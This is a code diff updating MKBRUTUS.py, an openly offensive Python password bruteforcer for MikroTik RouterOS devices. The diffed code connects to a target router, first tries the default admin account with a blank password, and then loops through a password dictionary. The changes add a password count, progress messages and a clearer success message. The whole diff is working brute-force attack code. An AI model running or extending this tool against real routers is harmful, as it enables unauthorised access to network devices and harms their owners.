@@ -3,7 +3,7 @@
 
 #=======================================================================================================================
 #
-# MKBRUTUS.py v1.0.0 - Password bruteforcer for MikroTik devices or boxes running RouterOS
+# MKBRUTUS.py v1.0.1 - Password bruteforcer for MikroTik devices or boxes running RouterOS
 #
 # AUTHORS:
 # Ramiro Caire   - email: ramiro.caire@gmail.com  / Twitter: @rcaire
@@ -52,7 +52,7 @@ import select
 import socket
 import time
 import signal
-
+import codecs
 
 
 banner=('''          _   _   _   _  _____  ____ _   _  ____ _   _ _____
@@ -278,19 +278,29 @@ def main():
 
     # Catch KeyboardInterrupt
     signal.signal(signal.SIGINT, signal_handler)
+    
     # Looking for default RouterOS creds
     defcredcheck = True
-
-    dictFile = open(dictionary,'r')
+    
+    # Get the number of lines in file
+    count = 0
+    dictFile = codecs.open(dictionary,'rb', encoding='utf-8', errors='ignore')
+    while 1:
+        buffer = dictFile.read(8192*1024)
+        if not buffer: break
+        count += buffer.count('\n')
+    dictFile.seek(0)
+    
+    # Passwords iteration & socket creation
+    items = 1
     for password in dictFile.readlines():
         password = password.strip('\n')
-
         s = None
         for res in socket.getaddrinfo(target, port, socket.AF_UNSPEC, socket.SOCK_STREAM):
             af, socktype, proto, canonname, sa = res
             try:
                  s = socket.socket(af, socktype, proto)
-                 # Timeout threshold = 2 secs
+                 # Timeout threshold = 5 secs
                  s.settimeout(5)
             except (socket.error):
                 s = None
@@ -305,7 +315,7 @@ def main():
                 print("[-] SOCKET ERROR! Check Target (IP or PORT parameters). Exiting...")
                 s.close()
                 sys.exit(1)
-
+        dictFile.close(  )
         apiros = ApiRos(s)
 
         # First of all, we'll try with RouterOS default credentials ("admin":"")
@@ -317,10 +327,10 @@ def main():
             print()
 
             if login == "!done":
-                print ("[+] Login successful!!! Default RouterOS credentials were not changed")
+                print ("[+] Login successful!!! Default RouterOS credentials were not changed. Log in with admin:<BLANK>")
                 sys.exit(0)
             else:
-                print("[-] Default RouterOS credentials were unsuccessful, trying with user's password list...")
+                print("[-] Default RouterOS credentials were unsuccessful, trying with " + str(count) + " passwords in list...")
                 print("")
                 defcredcheck = False
                 time.sleep(1)
@@ -329,11 +339,13 @@ def main():
         login = ''.join(loginoutput[0][0])
 
         if not quietmode:
-            print("[-] Trying User: " + user + " Pasword: " + password)
+            print("[-] Trying " + str(items) + " of " + str(count) + " Paswords - Current: " + password)
 
         if login == "!done":
            print("[+] Login successful!!! User: " + user + " Password: " + password)
            sys.exit(0)
+        items +=1
+
 
 if __name__ == '__main__':
     main()
